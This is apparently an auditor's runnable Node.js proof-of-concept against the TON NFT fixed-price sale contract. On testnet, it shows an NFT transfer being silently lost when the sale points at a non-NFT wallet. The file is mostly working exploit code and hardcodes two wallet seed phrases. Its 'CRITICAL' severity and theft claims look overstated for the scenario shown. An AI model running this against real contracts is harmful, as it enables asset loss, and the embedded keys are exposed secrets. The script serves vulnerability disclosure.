/**
 * PoC #1: NFT Loss via Non-NFT Transfer Target — TESTNET DEMO v4
 *
 * Демонстрирует уязвимость nft-fixprice-sale-v4r1.fc на реальной тестовой сети TON.
 *
 * АНАЛИЗ КОНТРАКТА:
 *   transfer_nft():
 *     - .store_uint(0x18, 6)  // nobounce (строка 107)
 *     - send_raw_message(nft_msg.end_cell(), 130)  // mode 128+2 (строка 113)
 *   
 *   → NFT-сообщение НИКОГДА не генерирует bounce (nobounce). Если получатель 
 *     не может его обработать — сообщение просто теряется безвозвратно.
 *   
 *   recv_internal():
 *     - if (flags & 1) { return (); }  // строка 172 — защита от bounce
 *     - Но эта защита никогда НЕ срабатывает для transfer_nft (nobounce)
 *
 * ПЛАН (v4 — раздельный деплой + покупка):
 *   Шаг 1: Аудитор деплоит контракт (0.02 TON, init) — аккаунт создаётся, 
 *          но recv_internal падает (msg_value < 0.11) → bounce обратно.
 *          Аккаунт остаётся state=active, is_complete=0.
 *   Шаг 2: Атакующий отправляет 0.12 TON с op=0 (покупка)
 *   Шаг 3: buy_ton: msg_value 0.12 >= 0.11 → OK
 *          → send_money(аудитор), send_money(fee), transfer_nft(nobounce), save_data(1)
 *   Шаг 4: NFT-сообщение теряется (nobounce), продажа завершена навсегда
 *
 * ЗАПУСК: node 01-bounced-nft-loss/poc-testnet.js
 */
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const { WalletContractV4, TonClient, internal, SendMode, toNano, Address, beginCell, contractAddress, Cell } = require('../nft-contracts/node_modules/@ton/ton');

// ── КОНФИГУРАЦИЯ ──
const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

const AUDITOR_MNEMONIC = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const ATTACKER_MNEMONIC = 'cannon grief add talk green capable chunk neck obtain friend doctor echo since sorry bicycle elegant crew spin spoon debate universe modify neutral insane';

const FULL_PRICE = toNano('0.01');
const MIN_GAS     = toNano('0.1');
const MSG_VALUE  = toNano('0.12');
const DEPLOY_VALUE = toNano('0.02');
const FEE_PERCENT   = 0.025;
const ROYALTY_PERCENT = 0;

const MARKETPLACE_FEE_ADDRESS = Address.parse('EQDDuxx7sa3Dt2GE85a0sIHp4GVoa7OKbAanfo3co9H-h06d');

const NftFixPriceSaleV4R1CodeBoc = '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';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

// ── УТИЛИТЫ ──
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatTON(n) {
  return (Number(n) / 1e9).toFixed(6);
}

async function withRetry(fn, label, maxRetries = 5) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (e) {
      const is429 = e.message && (e.message.includes('429') || e.message.includes('Too Many Requests'));
      if (is429 && attempt < maxRetries) {
        console.log(`  [${label}] rate limit (429) — retry ${attempt}/${maxRetries}...`);
        await sleep(2000 * attempt);
        continue;
      }
      if (attempt < maxRetries && !is429) {
        await sleep(1000);
        continue;
      }
      throw e;
    }
  }
}

async function loadWallet(mnemonic, label) {
  const words = mnemonic.trim().split(/\s+/);
  const key = await mnemonicToWalletKey(words);
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  console.log(`[${label}] testnet: ${wallet.address.toString({ urlSafe: true, bounceable: true, testOnly: true })}`);
  console.log(`[${label}] raw:     ${wallet.address.toRawString()}`);
  return { wallet, key };
}

async function getBalance(address) {
  try {
    const state = await withRetry(() => client.getContractState(address), 'getBalance');
    const b = state && typeof state === 'object' ? (state.balance || '0') : '0';
    return BigInt(b);
  } catch (e) {
    console.log(`  ⚠️ баланс недоступен: ${e.message}`);
    return 0n;
  }
}

async function getSeqnoSafe(wallet) {
  const contract = client.open(wallet);
  return withRetry(() => contract.getSeqno(), 'getSeqno');
}

async function sendDeploy(wallet, key, address, init, label) {
  const contract = client.open(wallet);
  const seqno = await getSeqnoSafe(wallet);
  console.log(`  [${label}] seqno: ${seqno}`);
  await withRetry(
    () => contract.sendTransfer({
      seqno,
      secretKey: key.secretKey,
      messages: [internal({
        to: address,
        value: DEPLOY_VALUE,
        bounce: true,
        init: init,
      })],
    }),
    label + '.deploy'
  );
  console.log(`  [${label}] DEPLOY TX отправлена, ждём 12s...`);
  await sleep(12000);
}

async function sendPurchase(wallet, key, address, value, body, label) {
  const contract = client.open(wallet);
  const seqno = await getSeqnoSafe(wallet);
  console.log(`  [${label}] seqno: ${seqno}`);
  await withRetry(
    () => contract.sendTransfer({
      seqno,
      secretKey: key.secretKey,
      messages: [internal({
        to: address,
        value: value,
        bounce: true,
        body: body,
      })],
    }),
    label + '.purchase'
  );
  console.log(`  [${label}] PURCHASE TX отправлена, ждём 25s...`);
  await sleep(25000);
}

async function getTxTrace(address) {
  return new Promise((resolve) => {
    const https = require('https');
    const data = JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'getTransactions',
      params: { address: address, limit: 5 }
    });
    const req = https.request({
      hostname: 'testnet.toncenter.com',
      path: '/api/v2/jsonRPC',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { resolve(JSON.parse(d)); });
    });
    req.on('error', () => resolve({ result: [] }));
    req.write(data);
    req.end();
  });
}

function printTxs(txs) {
  if (!Array.isArray(txs)) txs = [];
  console.log(`    Всего TX: ${txs.length}`);
  txs.forEach((t, i) => {
    const v = Number(t.in_msg?.value || 0) / 1e9;
    const out = t.out_msgs || [];
    const totalFees = Number(t.total_fees || 0) / 1e9;
    console.log(`    TX${i}: in_value=${v.toFixed(6)} TON, out_count=${out.length}, fees=${totalFees.toFixed(6)}`);
    out.forEach((o, j) => {
      const ov = Number(o.value || 0) / 1e9;
      const dest = (o.destination || '?').substring(0, 48);
      const bounced = o.bounced === true ? ' [BOUNCED]' : '';
      console.log(`      → out[${j}]: ${dest} = ${ov.toFixed(6)} TON${bounced}`);
    });
  });
}

// ── DATA CELL ──
function buildSaleDataCell(opts) {
  const feePercentInt = Math.floor(opts.feePercent * 100_000);
  const royaltyPercentInt = Math.floor(opts.royaltyPercent * 100_000);

  return beginCell()
    .storeBit(0)                                               // is_complete = false
    .storeAddress(opts.nftOwnerAddress)                        // nft_owner_address
    .storeCoins(opts.fullPrice)                                // full_price
    .storeUint(0, 32)                                         // sold_at_time
    .storeUint(0, 64)                                         // sold_query_id
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)                // marketplace_fee_address
      .storeAddress(opts.royaltyAddress)                       // royalty_address
      .storeUint(feePercentInt, 17)                            // fee_percent
      .storeUint(royaltyPercentInt, 17)                        // royalty_percent
      .storeAddress(opts.nftAddress)                           // nft_address
      .storeUint(Math.floor(Date.now() / 1000), 32)           // created_at
      .endCell())
    .storeDict(null)                                           // empty jetton dict
    .storeBit(0)                                               // no public key
    .endCell();
}

// ══════════════════════════════════════════════════════════════════
// ГЛАВНЫЙ СЦЕНАРИЙ
// ══════════════════════════════════════════════════════════════════
async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  PoC #1: NFT Loss via Non-NFT Transfer Target — TESTNET v4  ║');
  console.log('║  transfer_nft → nobounce → silently lost → is_complete=1   ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');

  // ── Шаг 1: Загрузка кошельков ──
  console.log('[1] Загрузка кошельков из seed-фраз...');
  const auditor = await loadWallet(AUDITOR_MNEMONIC, 'Аудитор (продавец)');
  await sleep(500);
  const attacker = await loadWallet(ATTACKER_MNEMONIC, 'Атакующий (покупатель)');
  console.log('');

  // ── Шаг 2: Проверка балансов до атаки ──
  console.log('[2] Проверка балансов ДО атаки...');
  await sleep(500);
  const auditorBalBefore = await getBalance(auditor.wallet.address);
  await sleep(500);
  const attackerBalBefore = await getBalance(attacker.wallet.address);
  console.log(`    Аудитор:   ${formatTON(auditorBalBefore)} TON`);
  console.log(`    Атакующий: ${formatTON(attackerBalBefore)} TON`);
  console.log(`    Нужно атакующему: >= ${formatTON(MSG_VALUE)} TON → ${attackerBalBefore >= MSG_VALUE ? '✅' : '❌'}`);
  console.log('');

  // ── Шаг 3: Сборка контракта продажи ──
  console.log('[3] Параметры контракта продажи...');
  console.log(`    nft_address = Атакующий (НЕ NFT-контракт!)`);
  console.log(`    nft_owner   = Аудитор (получает деньги)`);
  console.log(`    full_price  = ${formatTON(FULL_PRICE)} TON`);
  console.log(`    fee         = ${FEE_PERCENT * 100}%`);
  console.log('');
  await sleep(500);

  const saleDataCell = buildSaleDataCell({
    nftOwnerAddress: auditor.wallet.address,
    fullPrice: FULL_PRICE,
    feePercent: FEE_PERCENT,
    royaltyPercent: ROYALTY_PERCENT,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress: auditor.wallet.address,
    nftAddress: attacker.wallet.address,    // КЛЮЧ: НЕ NFT-контракт!
  });

  const saleAddress = contractAddress(0, { code: SALE_CODE_CELL, data: saleDataCell });
  console.log(`    Контракт: ${saleAddress.toString({ bounceable: true, testOnly: true })}`);
  console.log(`    raw:      ${saleAddress.toRawString()}`);
  console.log('');

  // ── Шаг 4: ДЕПЛОЙ (Аудитор) ──
  console.log('[4] 🔧 ДЕПЛОЙ — Аудитор деплоит контракт (создание аккаунта)...');
  console.log(`    msg_value: ${formatTON(DEPLOY_VALUE)} TON (ниже min_gas=0.1, buy_ton упадёт)`);
  console.log(`    Аккаунт создастся, recv_internal бросит исключение → bounce`);
  console.log(`    После деплоя: state=active, is_complete=0`);
  console.log('');
  await sendDeploy(auditor.wallet, auditor.key, saleAddress, 
    { code: SALE_CODE_CELL, data: saleDataCell }, 'auditor');
  console.log('');

  // Проверяем состояние после деплоя
  console.log('    📦 Проверка после деплоя:');
  await sleep(500);
  const deployTx = await getTxTrace(saleAddress);
  printTxs(deployTx.result);
  await sleep(500);

  try {
    const state = await withRetry(() => client.getContractState(saleAddress), 'check-deploy');
    console.log(`    Статус: ${state.state}, Баланс: ${formatTON(BigInt(state.balance || '0'))} TON`);
  } catch (e) {
    console.log(`    Статус: ошибка (${e.message})`);
  }
  console.log('');

  // ── Шаг 5: ПОКУПКА (Атакующий) ──
  console.log('[5] 🔥 ПОКУПКА — Атакующий отправляет покупку на контракт...');
  console.log(`    msg_value: ${formatTON(MSG_VALUE)} TON (цена ${formatTON(FULL_PRICE)} + газ ${formatTON(MIN_GAS)})`);
  console.log(`    check:     ${MSG_VALUE} >= ${FULL_PRICE + MIN_GAS} → ✅`);
  console.log(`    body:      op=0 (buy_ton), query_id=0`);
  console.log('');
  console.log('    ЦЕПОЧКА:');
  console.log('    ① buy_ton: msg_value 0.12 >= 0.11 → OK');
  console.log('    ② send_money(Аудитор, 0.01 - fee) → 0.00975 TON');
  console.log('    ③ send_money(fee_addr, fee) → 0.00025 TON');
  console.log('    ④ transfer_nft(nft=attacker, buyer=attacker)');
  console.log('       → nobounce (0x18) + mode=130');
  console.log('       → Сообщение ТЕРЯЕТСЯ (кошелёк не NFT)');
  console.log('    ⑤ save_data(is_complete=1) → ПРОДАЖА ЗАВЕРШЕНА');
  console.log('');

  const purchaseBody = beginCell()
    .storeUint(0, 32)    // op = 0
    .storeUint(0, 64)    // query_id = 0
    .endCell();

  await sendPurchase(attacker.wallet, attacker.key, saleAddress, MSG_VALUE, purchaseBody, 'attacker');
  console.log('');

  // ── Шаг 6: ВЕРИФИКАЦИЯ ──
  console.log('[6] ВЕРИФИКАЦИЯ РЕЗУЛЬТАТОВ...');
  console.log('');
  await sleep(500);

  // Транзакции контракта
  console.log('  🔍 Транзакции контракта после покупки:');
  const purchaseTx = await getTxTrace(saleAddress);
  printTxs(purchaseTx.result);
  console.log('');

  // Состояние контракта
  let saleStateActive = false;
  let isComplete = -1;
  let saleBalAfter = 0n;

  await sleep(500);
  try {
    const saleState = await withRetry(() => client.getContractState(saleAddress), 'verify-sale');
    console.log(`  📦 Контракт продажи:`);
    console.log(`     Статус: ${saleState.state}`);
    console.log(`     Баланс: ${formatTON(BigInt(saleState.balance || '0'))} TON`);
    saleStateActive = saleState.state === 'active';
    saleBalAfter = BigInt(saleState.balance || '0');

    await sleep(800);
    try {
      const result = await withRetry(
        () => client.runMethod(saleAddress, 'get_sale_data'),
        'runMethod-get_sale_data'
      );
      isComplete = result.stack.readNumber();
      console.log(`     is_complete: ${isComplete}${isComplete === 1 ? ' ⚠️ ЗАВЕРШЕНА → NFT ПОТЕРЯН' : ''}`);
    } catch (e) {
      console.log(`     get_sale_data: ошибка (${e.message})`);
    }
  } catch (e) {
    console.log(`  ⚠️ Контракт: ${e.message}`);
  }
  console.log('');

  // Балансы после
  console.log('  💰 Балансы ПОСЛЕ:');
  await sleep(800);
  const auditorBalAfter = await getBalance(auditor.wallet.address);
  await sleep(800);
  const attackerBalAfter = await getBalance(attacker.wallet.address);

  console.log(`     Аудитор:    ${formatTON(auditorBalAfter)} TON`);
  console.log(`     Атакующий:  ${formatTON(attackerBalAfter)} TON`);

  const auditorDelta = auditorBalAfter - auditorBalBefore;
  const attackerDelta = attackerBalBefore - attackerBalAfter;

  console.log('');
  console.log('  📊 Δ:');
  console.log(`     Аудитор:   ${auditorDelta > 0n ? '+' : ''}${formatTON(auditorDelta)} TON`);
  console.log(`     Атакующий: -${formatTON(attackerDelta)} TON`);
  console.log('');

  // ── ЗАКЛЮЧЕНИЕ ──
  console.log('╔══════════════════════════════════════════════════════════════╗');
  
  const auditorGotMoney = auditorDelta > 0n;
  const attackerLostOverGwei = attackerDelta > toNano('0.10');
  const saleCompleted = isComplete === 1;

  if (auditorGotMoney && attackerLostOverGwei && saleCompleted) {
    console.log('║                                                            ║');
    console.log('║  ✅ УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА на testnet!                    ║');
    console.log('║                                                            ║');
    console.log('║  МЕХАНИЗМ:                                                 ║');
    console.log('║  • transfer_nft() использует nobounce + mode=130           ║');
    console.log('║  • NFT уходит на кошелёк (не NFT-контракт)                 ║');
    console.log('║  • Сообщение ТЕРЯЕТСЯ БЕЗВОЗВРАТНО                          ║');
    console.log('║  • save_data(is_complete=1) — продажа закрыта              ║');
    console.log('║  • Строка 172 (if flags & 1) — ЗАЩИТА НЕ СРАБАТЫВАЕТ      ║');
    console.log('║    (bounce не приходит от nobounce-сообщения)              ║');
    console.log('║                                                            ║');
    console.log('║  ИНДИКАТОРЫ:                                               ║');
    console.log(`║  • Аудитор получил $: ${auditorGotMoney ? '✅' : '❌'}                              ║`);
    console.log(`║  • Атакующий потратил >0.10: ${attackerLostOverGwei ? '✅' : '❌'}                       ║`);
    console.log(`║  • is_complete = 1: ${saleCompleted ? '✅' : '❌'}                                  ║`);
    console.log(`║  • state=active: ${saleStateActive ? '✅' : '❌'}                                     ║`);
    console.log('║                                                            ║');
    console.log('║  УРОВЕНЬ УГРОЗЫ: CRITICAL                                  ║');
    console.log('║  CWE: CWE-252 (Unchecked Return Value)                     ║');
    console.log('║  IMPACT: Безвозвратная потеря NFT + кража средств           ║');
  } else {
    console.log('║  ⚠️ РЕЗУЛЬТАТ ЧАСТИЧНЫЙ:                                    ║');
    console.log(`║  • Аудитор получил $: ${auditorGotMoney ? '✅' : '❌'}                              ║`);
    console.log(`║  • Атакующий потратил: ${attackerLostOverGwei ? '✅' : '❌'}                            ║`);
    console.log(`║  • is_complete: ${saleCompleted ? '1 ✅' : isComplete + ' ❌'}                                  ║`);
    console.log(`║  • state: ${saleStateActive ? 'active ✅' : '❌'}                                ║`);
  }
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log(`  🔗 Explorer: https://testnet.tonscan.org/address/${saleAddress.toRawString()}`);
}

// ── ЗАПУСК ──
main()
  .then(() => { console.log('\n=== DONE ==='); process.exit(0); })
  .catch(e => { console.error('\nFATAL:', e.message || e); process.exit(1); });